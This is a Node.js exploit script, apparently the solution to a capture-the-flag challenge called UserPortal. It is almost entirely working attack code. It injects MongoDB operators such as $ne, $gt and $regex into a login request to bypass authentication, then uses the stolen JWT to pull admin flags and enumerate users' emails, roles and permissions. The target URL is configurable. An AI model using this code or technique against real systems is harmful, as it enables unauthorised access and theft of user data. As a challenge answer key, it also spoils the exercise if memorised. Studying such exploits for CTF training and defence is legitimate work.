#!/usr/bin/env node
/**
 * NoSQL Injection Exploit for UserPortal CTF Challenge
 * JavaScript/Node.js version
 * 
 * Usage: node exploit.js [--url http://localhost:3000] [--username admin]
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');

class UserPortalExploit {
    constructor(baseUrl = 'http://localhost:3000') {
        this.baseUrl = baseUrl;
        this.parsedUrl = new URL(baseUrl);
        this.httpModule = this.parsedUrl.protocol === 'https:' ? https : http;
    }

    printBanner() {
        const banner = `
╔══════════════════════════════════════════════════════════════╗
║                    UserPortal CTF Exploit                   ║
║                  NoSQL Injection Attack                     ║
║                    (Node.js Version)                        ║
╚══════════════════════════════════════════════════════════════╝
        `;
        console.log(banner);
    }

    async makeRequest(path, method = 'GET', data = null, headers = {}) {
        return new Promise((resolve, reject) => {
            const url = new URL(path, this.baseUrl);
            
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname + url.search,
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'UserPortal-Exploit-JS/1.0',
                    ...headers
                }
            };

            if (data) {
                const jsonData = JSON.stringify(data);
                options.headers['Content-Length'] = Buffer.byteLength(jsonData);
            }

            const req = this.httpModule.request(options, (res) => {
                let body = '';
                
                res.on('data', (chunk) => {
                    body += chunk;
                });
                
                res.on('end', () => {
                    try {
                        const jsonBody = body ? JSON.parse(body) : {};
                        resolve({
                            statusCode: res.statusCode,
                            headers: res.headers,
                            body: jsonBody,
                            rawBody: body
                        });
                    } catch (e) {
                        resolve({
                            statusCode: res.statusCode,
                            headers: res.headers,
                            body: {},
                            rawBody: body
                        });
                    }
                });
            });

            req.on('error', (err) => {
                reject(err);
            });

            req.setTimeout(10000, () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });

            if (data) {
                req.write(JSON.stringify(data));
            }
            
            req.end();
        });
    }

    async testConnection() {
        console.log(`[*] Testing connection to ${this.baseUrl}...`);
        
        try {
            const response = await this.makeRequest('/');
            
            if (response.statusCode === 200) {
                console.log(`[+] Target is reachable: ${this.baseUrl}`);
                return true;
            } else {
                console.log(`[-] Target returned status code: ${response.statusCode}`);
                return false;
            }
        } catch (error) {
            console.log(`[-] Failed to connect to target: ${error.message}`);
            return false;
        }
    }

    async nosqlInjectionLogin(username = 'admin') {
        console.log(`\n[*] Attempting NoSQL injection login for user: ${username}`);
        
        // NoSQL injection payloads
        const payloads = [
            { "$ne": null },          // Not equal to null
            { "$ne": "" },            // Not equal to empty string
            { "$gt": "" },            // Greater than empty string
            { "$regex": ".*" },       // Regex match anything
            { "$exists": true },      // Field exists
        ];

        for (let i = 0; i < payloads.length; i++) {
            const payload = payloads[i];
            console.log(`[*] Trying payload ${i + 1}/${payloads.length}:`, JSON.stringify(payload));
            
            const loginData = {
                username: username,
                password: payload
            };

            try {
                const response = await this.makeRequest('/api/auth/login', 'POST', loginData);
                
                if (response.statusCode === 200 && response.body.success) {
                    console.log(`[+] SUCCESS! NoSQL injection worked with payload:`, JSON.stringify(payload));
                    console.log(`[+] Obtained JWT token: ${response.body.token?.substring(0, 50)}...`);
                    console.log(`[+] User role: ${response.body.user?.role || 'N/A'}`);
                    return { token: response.body.token, user: response.body.user };
                } else {
                    console.log(`[-] Login failed: ${response.body.error || 'Unknown error'}`);
                }
            } catch (error) {
                console.log(`[-] Request failed: ${error.message}`);
            }
        }
        
        console.log('[-] All NoSQL injection attempts failed');
        return { token: null, user: null };
    }

    async accessAdminFlags(token) {
        console.log(`\n[*] Attempting to access admin flags with obtained token...`);
        
        const headers = { 'Authorization': `Bearer ${token}` };
        
        try {
            const response = await this.makeRequest('/api/admin/flags', 'GET', null, headers);
            
            if (response.statusCode === 200) {
                const flags = response.body.flags || [];
                
                console.log(`[+] SUCCESS! Retrieved ${flags.length} flag(s):`);
                console.log('='.repeat(60));
                
                flags.forEach(flag => {
                    console.log(`Flag Name: ${flag.name || 'N/A'}`);
                    console.log(`Flag Value: ${flag.value || 'N/A'}`);
                    console.log(`Description: ${flag.description || 'N/A'}`);
                    console.log(`Category: ${flag.category || 'N/A'}`);
                    console.log(`Points: ${flag.points || 'N/A'}`);
                    console.log('-'.repeat(40));
                });
                
                return flags;
            } else {
                console.log(`[-] Failed to access flags: HTTP ${response.statusCode}`);
                console.log(`[-] Response: ${response.rawBody.substring(0, 200)}`);
                return null;
            }
        } catch (error) {
            console.log(`[-] Request failed: ${error.message}`);
            return null;
        }
    }

    async enumerateUsers(token) {
        console.log(`\n[*] Enumerating users...`);
        
        const headers = { 'Authorization': `Bearer ${token}` };
        
        try {
            const response = await this.makeRequest('/api/users', 'GET', null, headers);
            
            if (response.statusCode === 200) {
                const users = response.body.users || [];
                
                console.log(`[+] Found ${users.length} users:`);
                console.log('-'.repeat(60));
                
                users.forEach(user => {
                    console.log(`Username: ${user.username || 'N/A'}`);
                    console.log(`Email: ${user.email || 'N/A'}`);
                    console.log(`Role: ${user.role || 'N/A'}`);
                    console.log(`Department: ${user.profile?.department || 'N/A'}`);
                    console.log(`Permissions: ${(user.permissions || []).join(', ')}`);
                    console.log('-'.repeat(30));
                });
                
                return users;
            } else {
                console.log(`[-] Failed to enumerate users: HTTP ${response.statusCode}`);
                return null;
            }
        } catch (error) {
            console.log(`[-] Request failed: ${error.message}`);
            return null;
        }
    }

    async runExploit(username = 'admin') {
        this.printBanner();
        
        // Test connection
        if (!(await this.testConnection())) {
            process.exit(1);
        }
        
        // Attempt NoSQL injection
        const { token, user } = await this.nosqlInjectionLogin(username);
        
        if (!token) {
            console.log('\n[-] Exploit failed: Could not bypass authentication');
            process.exit(1);
        }
        
        console.log(`\n[+] Authentication bypassed successfully!`);
        console.log(`[+] Logged in as: ${user?.username || 'N/A'} (${user?.role || 'N/A'})`);
        
        // Try to access admin flags
        const flags = await this.accessAdminFlags(token);
        
        // Enumerate users for additional information
        const users = await this.enumerateUsers(token);
        
        if (flags && flags.length > 0) {
            console.log(`\n[+] EXPLOIT SUCCESSFUL!`);
            console.log(`[+] CTF Flag obtained: ${flags[0].value || 'N/A'}`);
        } else {
            console.log(`\n[!] Partial success: Authentication bypassed but couldn't access flags`);
            console.log(`[!] User may not have sufficient permissions`);
        }
    }
}

// Command line argument parsing
function parseArgs() {
    const args = process.argv.slice(2);
    const options = {
        url: 'http://localhost:3000',
        username: 'admin'
    };
    
    for (let i = 0; i < args.length; i++) {
        if (args[i] === '--url' && i + 1 < args.length) {
            options.url = args[i + 1];
            i++;
        } else if (args[i] === '--username' && i + 1 < args.length) {
            options.username = args[i + 1];
            i++;
        } else if (args[i] === '--help' || args[i] === '-h') {
            console.log('Usage: node exploit.js [--url http://localhost:3000] [--username admin]');
            console.log('');
            console.log('Options:');
            console.log('  --url       Target URL (default: http://localhost:3000)');
            console.log('  --username  Username to target (default: admin)');
            console.log('  --help      Show this help message');
            process.exit(0);
        }
    }
    
    return options;
}

// Main execution
async function main() {
    const options = parseArgs();
    const exploit = new UserPortalExploit(options.url);
    
    try {
        await exploit.runExploit(options.username);
    } catch (error) {
        console.error(`\n[-] Exploit failed with error: ${error.message}`);
        process.exit(1);
    }
}

if (require.main === module) {
    main();
}
